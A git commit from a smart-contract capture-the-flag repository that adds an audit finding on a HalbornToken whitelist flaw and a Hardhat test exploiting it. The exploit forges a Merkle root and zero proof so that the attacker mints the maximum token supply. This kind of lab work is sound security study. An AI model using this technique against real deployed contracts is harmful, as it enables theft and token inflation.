01a4ed721925368eb7c878d7ccfee828c504460c
Donneger Etienne <23462475+Krow10@users.noreply.github.com>
2022-07-13 10:57:04 -0400

    Added first exploit for CTF_2

--- HalbornCTF_Solidity_Ethereum/CTF2_HalbornToken/report.md
+++ HalbornCTF_Solidity_Ethereum/CTF2_HalbornToken/report.md
@@ -1,14 +1,29 @@
 # Analysis of HalbornToken contract
 
 ## Table of Contents
-1. [Title](#1-Title)
+1. [`root` variable of the contract is set but never used](#1-root-variable-of-the-contract-is-set-but-never-used)
 
-## 1. Title
+## 1. `root` variable of the contract is set but never used
+*Severity: Critical*
 ### Description
+The `root` variable set in the constructor is constructed in a way similar to a [Merkle Tree root](https://ethereum.org/en/developers/docs/data-structures-and-encoding/patricia-merkle-trie/) to only allow certain addresses (presenting a valid proof) for minting tokens.
+
+This is how the `mintTokensWithWhitelist` function is supposed to work. However, for unknown reasons, the function sends a user supplied `_root` parameter to the `verify` function, in charge of validating the `msg.sender` and proof(s) associated with it.
+
+This means an attacker can send his own `_root` and `proof` to pass the validation function, resulting in the minting of an arbitrary amount of tokens for the attacker.
 
 ### Code
+```
+function mintTokensWithWhitelist(uint256 amount, bytes32 _root, bytes32[] memory _proof) public {
+    bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
+    require(verify(leaf, _root, _proof), "You are not whitelisted.");
+    _mint(msg.sender, amount);
+}
+```
 
 ### Recommendations
-**Immediate:**
+**Immediate:** Remove the `_root` parameter in the `mintTokensWithWhitelist` function and pass the storage variable `root` to the `verify` function instead.
 
 **Future:**
+- Simplify the whitelisting process by providing directly a list of addresses to the constructor or to a function using the [Initializable](https://docs.openzeppelin.com/contracts/4.x/api/proxy#Initializable) modifier.
+- Consider using proven and more secure alternatives for whitelisting users such as [Access Control contracts](https://docs.openzeppelin.com/contracts/4.x/api/access).
--- HalbornCTF_Solidity_Ethereum/CTF2_HalbornToken/test/HalbornToken.js
+++ HalbornCTF_Solidity_Ethereum/CTF2_HalbornToken/test/HalbornToken.js
@@ -2,11 +2,55 @@ const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
 describe('[HalbornToken] Exploits', function() {
-	beforeEach(async function() {
+	let attacker;
 
+	beforeEach(async function() {
+		[deployer, whitelisted, attacker] = await ethers.getSigners();
+
+		let whitelistedHash = ethers.utils.solidityKeccak256(['address'], [whitelisted.address]);
+		
+		// Create bytes32 proof from a "password" 
+		let proof = ethers.utils.keccak256(ethers.utils.id("S3CUR3_PR00F"));
+		
+		// Root is keccak256 of the whitelisted address hash and "password" proof that will pass the 'verify' function
+		let root = ethers.utils.solidityKeccak256(
+			['bytes32', 'bytes32'], 
+			ethers.BigNumber.from(whitelistedHash) > ethers.BigNumber.from(proof) ? [proof, whitelistedHash] : [whitelistedHash, proof] // Check hashing order for MerkleTree
+		);
+		// console.log("[JS]\nhash:", whitelistedHash, '\nproof:', proof, '\nroot:', root);
+
+		let deployerFunds = ethers.utils.parseEther('100000');
+		this.token = await (await ethers.getContractFactory('HalbornToken', deployer)).deploy(
+			"HalbornToken", // Name
+			"HAL", // Symbol
+			deployerFunds, // Minted amount for deployer 
+			deployer.address, // Deployer address
+			root
+		);
+
+		expect(
+			await this.token.balanceOf(deployer.address)
+		).to.be.equal(deployerFunds); // Check deployer minted tokens
+
+		let whitelistedFunds = ethers.utils.parseEther('10');
+		await (await this.token.connect(whitelisted)).mintTokensWithWhitelist(whitelistedFunds, root, [proof]); // Check validity of root + proof
+		expect(
+			await this.token.balanceOf(whitelisted.address)
+		).to.be.equal(whitelistedFunds); // Funds have been minted for whitelisted user
+
+		this.attackerInstance = await this.token.connect(attacker);
 	});
 
-	it('', async function() {
+	it('[Exploit #1] \'root\' variable of the contract is set but never used', async function() {
+		let attackerHash = ethers.utils.solidityKeccak256(['address'], [attacker.address]);
+		let proof = ethers.constants.HashZero; // Null proof
+		let root = ethers.utils.solidityKeccak256(['bytes32', 'bytes32'], [proof, attackerHash]); // Create valid root from attacker's address and empty proof
+		
+		let attackerFunds = ethers.constants.MaxUint256.sub(await this.token.totalSupply()); // Mint max amount of tokens available
 
+		await this.attackerInstance.mintTokensWithWhitelist(attackerFunds, root, [proof]);
+		expect(
+			await this.token.balanceOf(attacker.address)
+		).to.be.equal(attackerFunds);
 	});
 });
